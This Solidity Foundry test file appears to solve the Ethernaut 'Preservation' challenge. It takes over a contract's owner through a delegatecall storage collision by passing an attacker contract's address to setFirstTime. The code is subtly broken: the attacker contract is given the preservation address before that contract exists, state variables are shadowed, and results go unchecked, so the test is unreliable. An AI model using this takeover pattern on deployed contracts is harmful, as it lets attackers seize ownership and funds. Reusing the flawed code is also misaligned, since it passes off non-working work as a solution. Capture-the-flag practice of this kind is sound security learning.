// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Preservation, LibraryContract} from "../src/Preservation.sol";
import {Attacker} from "../src/Preservation.sol";

contract PreservationTest is Test {
    Preservation preservation;
    LibraryContract lib1;
    LibraryContract lib2;
    Attacker attacker;

    address private constant Alice = 0xBf0b5A4099F0bf6c8bC4252eBeC548Bae95602Ea;

    function setUp() public {
        attacker = new Attacker(address(preservation));

        lib1 = new LibraryContract();
        lib2 = new LibraryContract();
        preservation = new Preservation(address(lib1), address(lib2));
    }

    function testPreservation() public {
        address lib1 = preservation.timeZone1Library();
        address lib2 = preservation.timeZone2Library();
        address owner1 = preservation.owner();

        bytes memory data = abi.encodeWithSignature("setFirstTime(uint256)", address(attacker));
        (bool success,) = address(preservation).call(data);

        preservation.setFirstTime(block.timestamp);
        address owner2 = preservation.owner();
        assertEq(preservation.owner(), Alice);
    }
}
